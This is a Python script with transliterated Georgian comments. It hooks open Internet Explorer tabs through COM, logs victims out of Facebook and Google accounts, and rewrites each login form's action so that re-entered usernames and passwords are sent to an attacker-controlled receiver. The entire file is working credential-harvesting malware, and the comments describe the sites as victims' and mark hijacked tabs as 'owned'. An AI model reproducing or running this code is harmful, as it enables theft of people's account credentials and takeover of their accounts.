
import win32com.client
import time
import urlparse
import urllib

# chveni serveri sadac unda miviyot monacemebi msxverplis saitebidan
data_receiver = "http://localhost:8080/"

'''
sia samizne saitebis
logout_url <- sadac unda gadaviyvvanot GET -i rom gamovide
logout_form <- shevsebuli DOM elementi, POST -it gagzavna rom gamovides
login_form_index <- saxe cvlili loginis forma (yalbi forma chven rom mivigot monacemebi)
owned <- gaiara tu ara avtenturoba ( rom normalur logze gadaviyvanot )
'''
target_sites  = {}
target_sites["www.facebook.com"] = \
    {"logout_url"      : None,
     "logout_form"     : "logout_form",
     "login_form_index": 0,
     "owned"           : False}

target_sites["accounts.google.com"]    = \
    {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
     "logout_form"      : None,
     "login_form_index" : 0,
     "owned"            : False}

# orive domeinis variantze rom mushaobdes
target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

# IE clasis id 
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
# clasis id yvela tabze wvdomis sahvaleba
windows = win32com.client.Dispatch(clsid)

'''
	am fonqciis moshveobit sheidzleba itqvas rom vapauzebt
	cods sanam ar shesruldeba brauzershi brdzaneba
	magalitad gadagzavnili motxovnis dakmayofileba da axali gverdis chatvirta
'''
def wait_for_browser(browser):

    # davelodot brauzerma daasrulos gverdis chatvirtva
    while browser.ReadyState != 4 and browser.ReadyState != "complete" :
    	time.sleep(0.1)

	return

while True:
	# browser -is titoeuli gaxsnili tab -i
    for browser in windows:
    	# tviteuli tab -is misamarti
        url = urlparse.urlparse(browser.LocationUrl)
        # tu tabis misamarti emtxveva samizne misamartebs mashin
        if url.hostname in target_sites:

            if target_sites[url.hostname]["owned"]:
                continue # tu owned wesmaritia tab -shi gamotove

            # tu saits aqvs logout_url -i mashin gamoviyenot is adamianis saitidan gamoyvanistvis (dom -shi tua msgavsi linki gamoviyeno)
            if target_sites[url.hostname]["logout_url"]:

                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser) # lodini operaciis shesrulebistvis
            else: # tu ara mashin gamoviyenot form metodi
                # # full_doc shi sheviyvanet saitis DOM -i rom movdzebnot fomra ( yvela elementi wyarodan)
                full_doc = browser.Document.all

                # iterate looking for the logout form
                for i in full_doc:

                    try:                        

                        # tu vipovit formas saxelad "logout_form" gavagzavnot motxovna fb dan gamosvlaze
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit() # formis gagzavna
                            wait_for_browser(browser) # lodini operaciis shesrulebistvis

                    except:
                        pass

            try:
                # now we modify the login form
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                # arsebuli pirveli login formashi misamartis cvlileba rom chvens serverze gadmoigzavnos monacemebi
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True # monishvna rom gaira avtenturoba

            except:
                pass


        time.sleep(5)